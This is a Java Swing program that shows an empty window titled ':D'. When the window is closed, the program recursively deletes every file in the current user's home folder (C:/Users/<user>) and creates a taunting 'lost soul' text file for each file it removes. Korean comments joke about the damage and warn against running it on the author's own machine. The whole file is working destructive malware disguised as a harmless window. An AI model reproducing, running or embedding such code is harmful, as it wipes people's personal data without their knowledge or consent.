import javax.swing.*;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;

public class msi {
    public static void main(String[] args) {

        start();
    }

    public static void start() {
        JFrame jf = new JFrame();

        JPanel p = new JPanel();
        p.setPreferredSize(new Dimension(1280, 720));
        jf.add(p);
        jf.setPreferredSize(new Dimension(1280, 720));
        jf.pack();
        jf.setLocationRelativeTo(null);
        jf.setTitle(":D");
        jf.setVisible(true);

        jf.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                super.windowClosing(e);
                try {
                    String user = System.getProperty("user.name");

                    //절대 내 컴퓨터로 돌리지마시오.
                    deleteFolder(new File("C:/Users/" + user));
                    System.exit(0);
                } catch (Exception ex) {
                    System.out.println("큰 일을 하다보면 작은 예외정도는 눈 감는 법이죠.");
                }
            }
        });

    }

    public static void deleteFolder(File folder) throws Exception {
        File[] files = folder.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {

                    deleteFolder(file);
                } else {

                    File newFile = new File(file.getAbsolutePath() + "'s lost soul.txt");
                    newFile.createNewFile();

                    //   System.out.println("우히히히");
                    System.out.println("지워진 파일이름:" + file.getName());
                    file.delete();
                }
            }
        }
    }
}

